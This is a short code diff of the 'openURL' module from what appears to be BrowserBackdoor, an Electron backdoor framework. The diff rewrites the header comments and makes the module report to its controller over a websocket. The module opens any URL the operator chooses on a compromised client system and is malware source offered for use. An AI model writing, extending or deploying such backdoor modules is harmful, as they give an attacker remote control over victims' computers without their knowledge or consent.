@@ -1,19 +1,22 @@
 // INTERACTIVE
-/*
- * Copyright (c) 2016 IMcPwn  - http://imcpwn.com
- * BrowserBackdoorServer by IMcPwn.
- * See the file 'LICENSE' for copying permission
- *
- * Info: Opens a URL with the default application
- * Parameters: URL
- * Returns: undefined
- * Author: IMcPwn
+/**
+ * @file openURL Module
+ * @summary Opens a URL with the default application on the client system.
+ * @author IMcPwn 
+ * @see https://github.com/IMcPwn/browser-backdoor
+ * @license MIT
+ * @version 0.1
  */
 
 electron = require('electron');
 
+/**
+ * @param {String} url - The URL to open.
+ * @return {String} "Opened $url"
+ */
 openURL = function (url) {
     electron.shell.openExternal(url);
+    ws.send("Opened " + url);
 }
 
-return "\nUsage: openURL(url)\n- url is the URL to open with the default application.";
+ws.send("\nUsage: openURL(url)\n- url is the URL to open with the default application.");
